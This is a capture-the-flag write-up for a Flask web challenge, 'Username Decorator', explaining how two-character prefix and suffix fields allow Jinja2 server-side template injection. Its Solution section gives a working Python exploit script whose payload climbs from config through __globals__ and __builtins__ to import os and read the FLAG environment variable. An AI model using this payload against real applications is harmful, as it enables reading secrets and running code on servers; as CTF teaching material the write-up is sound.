# Username Decorator

## Description

Author: JW/Mani

My favorite social media platform, Prorope, has overhauled their username system and now supports prefixes and suffixes! Isn't that so cool?

For one, I know that I would really love to be  _the_  !! JW !!, so I made a website to preview these username changes.

Note: the flag is in an environment variable called  `FLAG`

[web3.zip](https://ctfmgci.jonathanw.dev/dl/bxmctf2023/web3.zip)

## Analysis 

```py
app.config['FLAG_LOCATION'] = 'os.getenv("FLAG")'
```

```py
def validate_username(username):
    return bool(re.fullmatch("[a-zA-Z0-9._\[\]\(\)\-=,]{2,}", username))
```
Validator only allows alphanumerical characters, dot, underscore, brackets, dash, equals sign, comma.

```py
if request.method == 'POST':
	prefix   = (request.form['prefix']   or '')[:2]
	username =  request.form['username'] or ''
	suffix   = (request.form['suffix']   or '')[:2]
```
If request type is post, then prefix, username and suffix can be set. Prefix and suffix can only be input's 2 characters, but username is not limited to length.

Since application is written in Python it's most likely is using Jinja as web template. From challenge description it looks like we can perform [Server Side Template Injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

## Solution 
```py
import requests
from bs4 import BeautifulSoup as BS

URL = 'http://<SERVER>:<PORT>/'
# URL = 'http://127.0.0.1:5000' # Emulate server to test locally

data = {
    'prefix': ::: raw'{{':::,
    'suffix': ::: raw'}}':::,
    'username': 'config.__class__.from_envvar.__globals__.__builtins__.__import__(request.args.a).getenv(request.args.b)'
}

params = { "a": "os", "b": "FLAG" }

resp = requests.post(URL, data=data, params=params)
html = BS(resp.text, 'html.parser')
print(html.prettify())
```